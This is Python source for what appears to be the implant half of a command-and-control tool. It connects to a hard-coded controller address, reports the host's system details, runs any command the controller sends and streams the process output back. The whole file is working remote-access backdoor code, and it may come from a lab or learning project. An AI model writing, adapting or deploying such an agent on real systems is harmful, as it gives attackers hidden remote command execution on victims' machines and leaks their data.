import os
import shlex
import subprocess

from platform import uname
from threading import Thread
from typing import IO

from protocol import *

COMMAND_AND_CONTROL = ("127.0.0.1", 1337)


peer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
peer.connect(COMMAND_AND_CONTROL)
c2 = ProtocolSession(peer)

processes = {}


class ProcessTask:
    command: str
    session: ProtocolSession
    process: subprocess.Popen

    def __init__(self, command, session):
        self.command = command
        self.session = session

    def start(self):
        self.process = subprocess.Popen(
            shlex.split(self.command),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        processes[self.process.pid] = self
        self.session.send(ProcessStartedFrame(self.command, self.process.pid))
        Thread(target=self.forward_stream, args=(self.process.stderr, 2), daemon=True).start()
        Thread(target=self.forward_stream, args=(self.process.stdout, 1), daemon=True).start()
        Thread(target=self.wait_process, daemon=True).start()

    def forward_stream(self, stream: IO, descriptor: int):
        while True:
            data = os.read(stream.fileno(), 512)
            if len(data) == 0:
                break
            self.session.send(ProcessPipeFrame(self.process.pid, descriptor, data))

    def wait_process(self):
        code = self.process.wait()
        self.session.send(ProcessTerminatedFrame(self.process.pid, code))

    def kill(self):
        if self.process.poll() is None:
            self.process.kill()


@c2.handler(PingFrame)
def handle(frame: PingFrame, session: ProtocolSession):
    session.send(PongFrame(frame.when))


@c2.handler(SystemInfoRequestFrame)
def handle(frame: SystemInfoRequestFrame, session: ProtocolSession):
    send_system_info(session)


@c2.handler(DieRequestFrame)
def handle(frame: DieRequestFrame, session: ProtocolSession):
    for pid, process in processes.items():
        process.kill()
    exit()


@c2.handler(ProcessStartRequestFrame)
def handle(frame: ProcessStartRequestFrame, session: ProtocolSession):
    ProcessTask(frame.command, session).start()


def send_system_info(session: ProtocolSession):
    info = uname()
    session.send(SystemInfoFrame(
        info.system,
        info.node,
        info.release,
        info.version,
        info.machine,
    ))


send_system_info(c2)
c2.run()
